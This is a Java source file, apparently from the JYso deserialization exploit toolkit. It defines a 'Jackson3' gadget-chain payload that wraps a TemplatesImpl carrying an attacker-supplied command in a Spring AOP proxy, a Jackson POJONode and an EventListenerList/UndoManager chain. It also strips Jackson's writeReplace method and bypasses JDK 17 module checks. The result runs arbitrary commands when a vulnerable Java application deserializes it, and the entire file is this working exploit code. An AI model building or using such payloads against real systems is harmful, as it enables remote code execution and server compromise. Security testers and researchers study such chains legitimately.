package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.utils.SuClassLoader;
import com.qi4l.JYso.gadgets.utils.Gadgets;

import com.qi4l.JYso.gadgets.utils.jdk17Bypass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;

import org.springframework.aop.framework.AdvisedSupport;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.swing.event.EventListenerList;
import javax.xml.transform.Templates;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.lang.reflect.*;

import java.util.ArrayList;
import java.util.Vector;

import static com.qi4l.JYso.gadgets.Config.Config.POOL;
import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;


public class Jackson3 implements ObjectPayload<Object> {
    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object            proxy   = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        return proxy;
    }

    public static Object getEventListenerList(Object obj) throws Exception {
        //EventListenerList list = new EventListenerList();
        POOL.insertClassPath(new ClassClassPath(Class.forName("javax.swing.event.EventListenerList")));
        final CtClass ctEventListenerList = POOL.get("javax.swing.event.EventListenerList");
        insertField(ctEventListenerList, "serialVersionUID", "private static final long serialVersionUID = -7977902244297240866L;");
        Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();

        //UndoManager undomanager = new UndoManager();
        POOL.insertClassPath(new ClassClassPath(Class.forName("javax.swing.undo.UndoManager")));
        final CtClass ctUndoManager = POOL.get("javax.swing.undo.UndoManager");
        insertField(ctUndoManager, "serialVersionUID", "private static final long serialVersionUID = -1045223116463488483L;");
        Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c     = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }

    @Override
    public Object getObject(final String command) throws Exception {
        try {
            CtClass  ctClass      = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception EE) {

        }

        ArrayList<Class> classes = new ArrayList<>();
        classes.add(TemplatesImpl.class);
        classes.add(POJONode.class);
        classes.add(EventListenerList.class);
        classes.add(Jackson3.class);
        classes.add(Field.class);
        classes.add(Method.class);
        new jdk17Bypass().bypassModule(classes);


        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));

        Object eventListenerList = getEventListenerList(node);

        return eventListenerList;
    }


}
